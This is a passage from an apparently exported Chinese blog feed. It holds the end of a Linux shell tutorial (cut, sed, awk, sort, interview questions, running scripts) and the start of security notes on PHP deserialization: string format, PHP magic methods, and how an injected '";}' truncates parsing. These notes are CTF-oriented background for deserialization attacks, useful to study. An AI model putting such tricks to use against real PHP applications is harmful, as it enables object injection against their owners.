</tr>
<tr class="odd">
<td>-n</td>
<td>取消分割多字节字符。仅和-b一起使用。</td>
</tr>
</tbody>
</table>
<p>注意：</p>
<ul>
<li>如果不指定file参数，cut命令将读取标准输入，必须指定-b,-c或-f标志之一。</li>
<li>-d 后面的值可以不加引号，除非有空格！</li>
</ul>
<p>举个例子：</p>
<p>首先准备好一个文件 cut.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abandon give</span><br><span class="line">a g</span><br><span class="line">c d</span><br><span class="line">ddfas erwf</span><br></pre></td></tr></table></figure></p>
<p>中间间隔一个空格的大小。</p>
<p>切割该文件的第一列： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d &quot; &quot; -f 1 cut.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527114432.png" /></p>
<p>切割文件的第二列： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d &quot; &quot; -f 2 cut.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527114501.png" /></p>
<p>切割出该文件的 abondon 这一个词： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat cut.txt|grep abandon|cut -d &#x27; &#x27; -f 1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527114836.png" /></p>
<p>切割出环境变量中的第二个值。环境变量以 <code>:</code> 作为分隔符
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH|cut -d &#x27;:&#x27; -f 2</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527115131.png" /></p>
<p>如果需要环境变量中第二个往后的所有值： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH|cut -d &#x27;:&#x27; -f 2-</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527115223.png" /></p>
<p>从ifconfig中切割出IP地址 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0|grep netmask|cut -d &#x27; &#x27; -f 10 # 需要数一下 inet 前面有几个空格</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527115847.png" /></p>
<p>或者这样，不用数空格 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0|grep netmask|cut -d t -f 2|cut -d &#x27; &#x27; -f 2</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527120059.png" /></p>
<h2 id="sed">10.2. sed</h2>
<p>sed是一种流编辑器，他一次处理一行内容。处理时，把当前处理的行存储再临时缓冲区中，称为“模式空间”，接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送完屏幕，接着处理下一行。这样不断重复，知道文件末尾。<strong>原本文件的内容不会发生改变</strong>，除非使用重定向存储输出。</p>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed [选项] &#x27;command&#x27; file</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr class="header">
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-e</td>
<td>直接在指令列模式上进行sed的动作编辑</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>command</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>a</td>
<td>a的后面可以接字符串，在下一行出现</td>
</tr>
<tr class="even">
<td>d</td>
<td>删除</td>
</tr>
<tr class="odd">
<td>s</td>
<td>查找并替换</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<p>在 cut.txt 文件内的第二行下新增一行 "hello hello" <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed &quot;2a hello hello&quot; cut.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527120754.png" /></p>
<p>删除包含 give 的所有行： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed &quot;/give/d&quot; cut.txt # / 是必须的</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527121129.png" /></p>
<p>删除特定行： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed &quot;2d&quot; cut.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527121142.png" /></p>
<p>将 cut.txt 中的 give 替换为 never： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed &quot;s/give/never/g&quot; cut.txt # g 表示global</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527121329.png" /></p>
<p>将第二行删除，并且替换 give 为 never： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -e &quot;2d&quot; -e &quot;s/give/never/g&quot; cut.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527121513.png" /></p>
<blockquote>
<p>个人理解：需要执行多次命令的时候使用 -e</p>
</blockquote>
<h2 id="awk">10.3. awk</h2>
<p>把文件逐行读入，以空格为默认分隔符将每行切片，切开的部分再进行分析处理。</p>
<h3 id="基本用法">10.3.1. 基本用法</h3>
<p>基本用法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk [选项] &#x27;pattern1&#123;action1&#125; pattern2&#123;2&#125; ...&#x27; filename</span><br></pre></td></tr></table></figure></p>
<ul>
<li>pattern：表示AWK再数据中查找的内容，就是匹配模式（正则）</li>
<li>action：找到匹配内容时执行的一系列命令</li>
</ul>
<table>
<thead>
<tr class="header">
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-F</td>
<td>指定输入文件的分隔符</td>
</tr>
<tr class="even">
<td>-v</td>
<td>赋值一个用户定义的变量</td>
</tr>
</tbody>
</table>
<p>例子：（用 /etc/passwd 作为操作文件）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/passwd .</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527132848.png" /></p>
<ol type="1">
<li>搜索passwd中以root关键词开头的所有行，并输出该行的第7列</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F : &#x27;/^root/ &#123;print $7&#125;&#x27; passwd</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527132909.png" /></p>
<ol start="2" type="1">
<li>搜索 passwd 以root关键词开头的所有行，并输出该行的第1、7列，中间以
<code>,</code> 分隔</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F : &#x27;/^root/ &#123;print $1&quot;,&quot;$7&#125;&#x27; passwd</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527133053.png" /></p>
<ol start="3" type="1">
<li>只显示第一列和第七列，以逗号分隔，且在所有行前面添加列名 user,shell
在最后一行添加“m1ku, /bin/zuishuai”</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F : &#x27;BEGIN&#123;print &quot;user,shell&quot;&#125; &#123;print $1&quot;,&quot;$7&#125; END&#123;print &quot;m1ku, /bin/zuishuai&quot;&#125;&#x27; passwd</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527133558.png" /></p>
<ol start="4" type="1">
<li>将passwd文件中的用户id增加数值1并输出</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F : -v i=1 &#x27;&#123;print $3+i&#125;&#x27; passwd  # 注意是 + i，而不是 $i</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527133846.png" /></p>
<h3 id="内置变量">10.3.2. 内置变量</h3>
<table>
<colgroup>
<col style="width: 40%" />
<col style="width: 60%" />
</colgroup>
<thead>
<tr class="header">
<th>变量</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>FILENAME</td>
<td>文件名</td>
</tr>
<tr class="even">
<td>NR(number of records)</td>
<td>已读的记录数</td>
</tr>
<tr class="odd">
<td>NF(number of fields)</td>
<td>浏览记录的域的个数（切割后，列的个数）</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<ol type="1">
<li>统计 passwd 文件名、行数，列数</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F : &#x27;&#123;print &quot;filename: &quot; FILENAME &quot;, lineNo: &quot; NR &quot;, columns: &quot; NF&#125;&#x27; passwd</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527134245.png" /></p>
<ol start="2" type="1">
<li>切割ifconfig中的ip</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0|grep netmask|awk &#x27;&#123;print $2&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527134543.png" /></p>
<blockquote>
<p>根据结果可知：不管是几个空格，awk都当作一个空格，这与cut是不同的</p>
</blockquote>
<ol start="3" type="1">
<li>查询 cut.txt 中空行所在的行号</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527134846.png" /></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;/^$/ &#123;print NR&#125;&#x27; cut.txt</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527134834.png" /></p>
<h2 id="sort">10.4. sort</h2>
<p>sort 命令将文件进行排序，并将排序结果标准输出。</p>
<p>基本语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sort (选项) (参数)</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr class="header">
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-n</td>
<td>依照数值的大小排序</td>
</tr>
<tr class="even">
<td>-r</td>
<td>以相反的顺序排序</td>
</tr>
<tr class="odd">
<td>-t</td>
<td>设置排序是所有的分隔字符</td>
</tr>
<tr class="even">
<td>-k</td>
<td>指定需要排序的列</td>
</tr>
</tbody>
</table>
<p>参数：指定待排序的文件列表</p>
<p>例子：</p>
<p>数据准备： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/shellLearn]</span><br><span class="line">└─$ cat sort.sh </span><br><span class="line">bb:40:5.4</span><br><span class="line">bd:20:4.2</span><br><span class="line">xz:50:2.3</span><br><span class="line">cls:10:3.5</span><br><span class="line">ss:30:1.6</span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li>按照 <code>:</code> 分割后的第三列倒序排序<br />
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sort -t : -nrk 3 sort.sh </span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意 k 一定要放在最后，或者单独出去，比如 sort -t : -nr -k 3 sort.sh</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527135734.png" /></p>
<h1 id="企业真实面试题">11. 企业真实面试题</h1>
<h2 id="京东">11.1. 京东</h2>
<ol type="1">
<li>使用 Linux 命令查询文件中空行所在的行号</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;/^$/ &#123;print NR&#125;&#x27; cut.txt</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><p>有文件 chengji.txt 内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">张三 40</span><br><span class="line">李四 50</span><br><span class="line">王五 60</span><br></pre></td></tr></table></figure></p>
<p>使用Linux命令计算第二列的和并输出</p></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat chengji.txt|awk -F &#x27; &#x27; &#x27;&#123;sum+=$2&#125; END &#123;print sum&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527151428.png" /></p>
<h2 id="搜狐和讯网">11.2. 搜狐&amp;和讯网</h2>
<ol type="1">
<li>shell脚本如何检查一个文件是否存在？如果不存在该如何处理？</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ -f file.txt ]; then</span><br><span class="line">    echo &quot;file exist.&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;file not exits.&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h2 id="新浪">11.3. 新浪</h2>
<ol type="1">
<li><p>用shell写一个脚本，对文本中无需的一列数字排序 num.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9</span><br><span class="line">8</span><br><span class="line">7</span><br><span class="line">4</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">6</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p &quot;please input the file&#x27;s name: &quot; file</span><br><span class="line"></span><br><span class="line">if [ -f $file ]; then</span><br><span class="line">   sort -n $file </span><br><span class="line">else</span><br><span class="line">    echo &quot;file not exist.&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527152342.png" /></p>
<h2 id="金和网络">11.4. 金和网络</h2>
<ol type="1">
<li>使用shell命令写出查找当前文件夹 <code>/home/m1ku/shellLearn</code>
下所有的文本文件内容中包含有字符 abandon 的文件名称</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -r give /home/m1ku/shellLearn | cut -d : -f 1</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527152859.png" /></p>
<h1 id="番外">12. 番外</h1>
<ol type="1">
<li>Linux中的很多参数值都可以不加引号，除非参数值中带有空格。</li>
</ol>
<h2 id="执行shell脚本">12.1. 执行shell脚本</h2>
<h3 id="在新进程中运行">12.1.1. 在新进程中运行</h3>
<h4 id="将shell脚本作为程序运行">12.1.1.1. 将shell脚本作为程序运行</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./helloworld.sh</span><br></pre></td></tr></table></figure>
<p>整条命令的意思是执行当前目录下的 helloworld.sh 脚本。如果不写
<code>./</code>，Linux 会到系统路径（由 PATH 环境变量指定）下查找
helloworld.sh，而系统路径下显然不存在这个脚本，所以会执行失败。</p>
<p><strong>通过这种方式执行脚本，脚本文件的第一行<code>#!/bin/bash</code>一定要写对（可能是其他的解释器），好让系统可以找到正确的解释器</strong></p>
<p>用户需要对该文件具有执行权限。</p>
<h4 id="将shell脚本作为参数传递给bash解释器">12.1.1.2.
将shell脚本作为参数传递给bash解释器</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. bash helloworld.sh</span><br><span class="line">2. /bin/bash helloworld.sh</span><br></pre></td></tr></table></figure>
<p>通过该方式运行脚本文件，不需要再第一个指定解释器信息，写了也没什么用。</p>
<p>两条命令都可以。第一条命令：系统会先去环境变量中查找是否有名为bash的可执行文件，然后再利用bash去执行
helloworld.sh；第二条命令：给出了bash的绝对路径，系统就不需要去查找，直接调用bash执行脚本文件即可。后者少了一个查找bash的过程。</p>
<p>本质上是bash读取脚本文件的内容，并当作命令去执行。因此，用户需要对脚本文件具有读权限。</p>
<h4 id="检测是否开启了新进程">12.1.1.3. 检测是否开启了新进程</h4>
<p>可以编写脚本 check.sh 代码如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo $$ # 输出当前进程PID</span><br></pre></td></tr></table></figure></p>
<p>先执行 <code>echo $$</code>
查看当前的shell进程id，然后分别执行下面两条命令查看对应的pid：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. bash check.sh</span><br><span class="line">2. ./check.sh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527162238.png" /></p>
<p>可以看到三条命令的结果不同，这也说明了上面的两种执行shell脚本的方式是在新进程中执行的。</p>
<h3 id="在当前进程中执行">12.1.2. 在当前进程中执行</h3>
<p>这里需要引入一个新的命令——source 命令。source 是 Shell
内置命令的一种，它会读取脚本文件中的代码，并依次执行所有语句。你也可以理解为，source
命令会强制执行脚本文件中的全部命令，而<strong>忽略脚本文件的执行权限，但是得有读权限</strong>。</p>
<p>两种命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. source file</span><br><span class="line">2. . file</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意：必须加上文件的路径，即使在当前目录下也得使用
<code>./filename</code></p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527162603.png" /></p>
<p>检查一下是否是在当前进程中执行的，输入 <code>echo $$</code>
查询当前进程 pid</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220527162709.png" /></p>
<p>可以观察到，三条命令的结果是一样，这也证明了这种方式执行脚本文件是在当前进程内。</p>
]]></content>
      <tags>
        <tag>shell基础</tag>
        <tag>Linux基础</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化知识点</title>
    <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>个人总结的知识点，持续更新。</p>
<span id="more"></span>
<h1 id="反序列化概念特点">1 反序列化概念、特点</h1>
<h2 id="反序列化概念">1.1 反序列化概念</h2>
<p>序列化就是将对象转换成字符串。字符串包括 <strong>属性名</strong>
<strong>属性值</strong>
<strong>属性类型</strong>和<strong>该对象对应的类名</strong>。</p>
<p>反序列化则相反将字符串重新恢复成对象。</p>
<p>对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。</p>
<p>如下例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">3</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Sch0lar&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O   代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line"><span class="number">3</span>   代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line"><span class="number">3</span>   代表三个属性</span><br><span class="line">s   代表字符串</span><br><span class="line"><span class="number">4</span>   代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span> 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure></p>
<h2 id="反序列化特点">1.2 反序列化特点</h2>
<ol type="1">
<li><strong>php在反序列化时，底层代码是以 <code>;</code>
作为字段的分隔，以 <code>&#125;</code> 作为结尾，并且是根据长度判断内容的
，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化</strong>
。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">序列化结果为：</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>超出的部分不会被发序列化成功，如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line">var_dump(unserialize(serialize(<span class="variable">$lemon</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="keyword">object</span>(A)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以<code>";&#125;</code>结束的，<strong>那如果把<code>";&#125;</code>添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了</strong>。</p>
<ol start="2" type="1">
<li><p><strong>长度不对应的时候会报错</strong> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;12&quot;;&#125;&#x27;</span>;  </span><br><span class="line"><span class="comment">// 注意 s:6:&quot;12&quot; 明显长度不够</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>可以在反序列化类中不存在的元素</strong>。
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:5:&quot;pass2&quot;;s:4:&quot;1234&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// 注意要修改A后面的值，要与后面的属性个数对应</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：（原来的类中没有pass2这个属性）</span><br><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass2&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="常见的魔术方法">2 常见的魔术方法</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct() 创建对象时调用</span><br><span class="line">__destruct() 销毁对象时调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
<p>PHP将所有以 <strong><strong><strong> （两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 </strong></strong></strong> 为前缀。</p>
<h2 id="sleep">2.1 <code>__sleep()</code></h2>
<p>在使用 <code>serialize()</code> 函数时，程序会检查类中是否存在一个
<code>__sleep()</code>
魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</p>
<h2 id="wakeup">2.2 <code>__wakeup</code></h2>
<p>在使用 <code>unserialize()</code> 时，会检查是否存在一个
<code>__wakeup()</code>魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。（注意与
<code>__sleep()</code> 对比）</p>
<h2 id="tostring">2.3 <code>__toString</code></h2>
<p><code>__toString()</code>
方法用于定义一个类被当成字符串时该如何处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$foo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) 										 	      </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="variable">$foo</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;foo;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> TestClass(<span class="string">&#x27;Hello&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<p>这里<code>echo $class;</code>把一个类对象当作字符串变量打印，因此执行了<code>__toSting()</code>，然后返回<code>$this-&gt;foo</code>，即Hello。</p>
<h2 id="invoke">2.4<code>__invoke</code></h2>
<p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>
方法会被自动调用。(本特性只在 PHP 5.3.0 及以上版本有效。)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> CallableClass();</span><br><span class="line"><span class="variable">$obj</span>(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<p>直接将类对象当作一个函数使用，从而直接调用了<code>__invoke()</code>方法，所以返回结果为<code>int(5)</code></p>
<h2 id="construct">2.5 <code>__construct()</code></h2>
